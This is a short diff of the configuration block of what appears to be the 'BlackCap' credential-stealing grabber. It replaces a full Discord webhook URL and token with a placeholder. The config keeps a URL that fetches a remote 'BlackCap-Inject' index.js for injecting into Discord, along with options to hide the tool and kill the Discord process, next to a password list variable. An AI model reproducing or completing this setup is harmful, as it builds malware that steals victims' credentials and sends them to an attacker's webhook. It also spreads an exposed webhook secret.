@@ -50,7 +50,7 @@ Passw = [];
 
 
 __config__ = {
-    'yourwebhookurl': "https://discord.com/api/webhooks/1032256693456863313/SQp4JfwcxaiY46cRexYmfwqwLy7aP4DgRyqMF5RgHqSaIg0gDsr3KNU9-Bgf-spMyqQc",
+    'yourwebhookurl': "Place your webhook here",
     'blackcap_inject_url': "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
     'hide': 'no',
     'kill_discord_process': True,
